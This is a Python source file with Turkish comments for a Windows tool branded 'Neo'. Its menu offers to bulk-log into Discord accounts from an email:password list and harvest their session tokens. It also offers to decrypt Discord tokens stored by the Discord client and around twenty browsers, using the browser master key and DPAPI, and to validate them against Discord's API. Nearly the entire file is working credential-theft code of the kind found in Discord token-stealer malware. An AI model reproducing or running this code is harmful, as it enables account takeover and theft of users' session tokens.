import aiohttp
import asyncio
import json
import os
import msvcrt
import webbrowser
from base64 import b64decode
from re import findall
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
import requests

# Konsol boyut ayar fonksiyonları
def set_console_size(width=80, height=25):
    os.system(f'mode con: cols={width} lines={height}')

def set_custom_console_size():
    os.system('mode con: cols=60 lines=30')

def set_large_console_size():
    os.system('mode con: cols=135 lines=30')

# ASCII sanatı ve menü fonksiyonları
def print_ascii_art():
    art = """
    
                \033[92m███╗   ██╗███████╗ ██████╗ 
                ████╗  ██║██╔════╝██╔═══██╗
                ██╔██╗ ██║█████╗  ██║   ██║
                ██║╚██╗██║██╔══╝  ██║   ██║
                ██║ ╚████║███████╗╚██████╔╝
                ╚═╝  ╚═══╝╚══════╝ ╚═════╝\033[0m  
                
                
                \033[92mhttps://github.com/Neoexe01\033[0m
    """
    print(art)

def print_menu():
    set_custom_console_size()
    os.system('cls' if os.name == 'nt' else 'clear')
    print_ascii_art()
    print("\033[92m[1]  -  Start\033[0m")
    print("\033[92m[2]  -  Show Tokens.txt\033[0m")
    print("\033[92m[3]  -  Get own token\033[0m")
    print("\033[92m[4]  -  Social\033[0m")

def wait_for_keypress():
    print("\nPress any key to continue...")
    msvcrt.getch()

def show_tokens():
    set_large_console_size()
    os.system('cls' if os.name == 'nt' else 'clear')
    if os.path.exists('tokens.txt'):
        with open('tokens.txt', 'r') as f:
            print(f.read())
    else:
        print("tokens.txt not found.")
    wait_for_keypress()

# CAPTCHA çözme fonksiyonu (manuel çözüm)
async def solve_captcha():
    print("You need to solve the CAPTCHA:")
    captcha_solution = input("Enter CAPTCHA solution: ")
    return captcha_solution

# Discord token alma fonksiyonu
async def get_discord_token(session, email, password, backup_code=None):
    url = "https://discord.com/api/v9/auth/login"
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }
    payload = {
        "login": email,
        "password": password,
        "undelete": False,
        "captcha_key": None,
        "login_source": None,
        "gift_code_sku_id": None,
        "backup_code": backup_code
    }

    async with session.post(url, headers=headers, json=payload) as response:
        response_text = await response.text()
        if response.status == 200:
            try:
                data = await response.json()
                return data.get("token")
            except json.JSONDecodeError:
                return None
        elif response.status == 403 and 'captcha_sitekey' in response_text:
            captcha_solution = await solve_captcha()
            payload["captcha_key"] = captcha_solution
            async with session.post(url, headers=headers, json=payload) as captcha_response:
                if captcha_response.status == 200:
                    try:
                        data = await captcha_response.json()
                        return data.get("token")
                    except json.JSONDecodeError:
                        return None
        elif response.status == 403 and 'backup_code' in response_text:
            if backup_code:
                payload["backup_code"] = backup_code
                async with session.post(url, headers=headers, json=payload) as backup_response:
                    if backup_response.status == 200:
                        try:
                            data = await backup_response.json()
                            return data.get("token")
                        except json.JSONDecodeError:
                            return None
        elif response.status == 429:
            retry_after = json.loads(response_text).get("retry_after", 1)
            await asyncio.sleep(retry_after)
            return await get_discord_token(session, email, password, backup_code)
        else:
            if 'Rate limited' not in response_text:
                print(f"Failed for {email}: {response_text}")
            return None

# Hesap işleme fonksiyonu
async def process_account(session, account):
    parts = account.split(':')
    email, password = parts[0], parts[1]
    backup_code = parts[2] if len(parts) > 2 else None
    token = None
    for attempt in range(max_retries):
        token = await get_discord_token(session, email, password, backup_code)
        if token:
            break
        print(f"Attempt {attempt + 1} failed for {email}")
    return email, password, token

# Tokenları çekme fonksiyonu
async def fetch_tokens(accounts):
    set_large_console_size()
    os.system('cls' if os.name == 'nt' else 'clear')
    async with aiohttp.ClientSession() as session:
        tasks = [process_account(session, account) for account in accounts]
        results = await asyncio.gather(*tasks)

        with open(output_file, 'w') as out_f:
            for email, password, token in results:
                if token:
                    out_f.write(f"{email}:{password}:{token}\n")
                    print(f"Token successfully obtained for {email}")
                else:
                    out_f.write(f"{email}:{password}:FAILED\n")
                    print(f"Token could not be obtained for {email}")
    wait_for_keypress()

# Token çözme fonksiyonu
def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        return "Error"

# Discord tokenları alma ve kaydetme fonksiyonu
async def get_own_token():
    tokens = []
    cleaned = []
    valid_tokens = []
    already_check = set()
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    chrome = local + "\\Google\\Chrome\\User Data"
    paths = {
        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Lightcord': roaming + '\\Lightcord',
        'Discord PTB': roaming + '\\discordptb',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Amigo': local + '\\Amigo\\User Data',
        'Torch': local + '\\Torch\\User Data',
        'Kometa': local + '\\Kometa\\User Data',
        'Orbitum': local + '\\Orbitum\\User Data',
        'CentBrowser': local + '\\CentBrowser\\User Data',
        '7Star': local + '\\7Star\\7Star\\User Data',
        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
        'Chrome': chrome + 'Default',
        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': local + '\\Iridium\\User Data\\Default'
    }
    async with aiohttp.ClientSession() as session:
        for platform, path in paths.items():
            if not os.path.exists(path): continue
            try:
                with open(path + f"\\Local State", "r") as file:
                    key = json.loads(file.read())['os_crypt']['encrypted_key']
            except: continue
            for file in os.listdir(path + f"\\Local Storage\\leveldb\\"):
                if not file.endswith(".ldb") and not file.endswith(".log"): continue
                try:
                    with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                        for x in files.readlines():
                            x.strip()
                            for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                tokens.append(values)
                except PermissionError: continue
            for i in tokens:
                if i.endswith("\\"):
                    i.replace("\\", "")
                elif i not in cleaned:
                    cleaned.append(i)
            tasks = []
            for token in cleaned:
                try:
                    tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
                    tasks.append(session.get('https://discordapp.com/api/v6/users/@me', headers={'Authorization': tok, 'Content-Type': 'application/json'}))
                except IndexError: continue
            responses = await asyncio.gather(*tasks)
            for response in responses:
                if response.status == 200:
                    res_json = await response.json()
                    user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                    tok = response.request_info.headers['Authorization']
                    if tok not in already_check:
                        valid_tokens.append((user_name, tok))
                        already_check.add(tok)
                        print(f"token={tok}")
                        print(f"token={user_name}")
                        print("")
    return valid_tokens

async def save_own_tokens():
    tokens = await get_own_token()
    with open('Own_tokens.txt', 'w') as f:
        for user_name, token in tokens:
            f.write(f"{user_name}:{token}\n")
    print("Tokens saved to 'Own_tokens.txt'.")

# Ana fonksiyon
async def main():
    input_file = 'accounts.txt'
    global output_file
    output_file = 'tokens.txt'
    global max_retries
    max_retries = 2

    with open(input_file, 'r') as f:
        accounts = [line.strip() for line in f.readlines()]

    while True:
        print_menu()
        choice = input("\n> ")
        if choice == '1':
            await fetch_tokens(accounts)
        elif choice == '2':
            show_tokens()
        elif choice == '3':
            set_large_console_size()
            os.system('cls' if os.name == 'nt' else 'clear')
            await save_own_tokens()
            wait_for_keypress()
        elif choice == '4':
            webbrowser.open("https://github.com/Neoexe01")
            wait_for_keypress()
        else:
            print("Invalid option. Please try again.")

# Ana fonksiyonu çalıştır
asyncio.run(main())
